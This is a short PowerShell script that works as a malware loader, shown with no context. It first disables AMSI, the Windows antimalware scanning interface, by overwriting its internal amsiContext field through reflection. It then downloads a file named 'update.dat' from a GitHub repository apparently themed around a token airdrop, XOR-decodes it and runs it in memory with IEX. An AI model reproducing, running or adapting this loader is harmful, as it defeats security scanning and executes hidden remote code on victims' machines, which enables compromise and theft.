try{$t=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$b=[Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static;$f=$t.GetField("amsiContext",$b);$p=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($p,0)}catch{}
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$enc=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat')
IEX([Text.Encoding]::UTF8.GetString(($enc|%{$_-bxor0xAE})))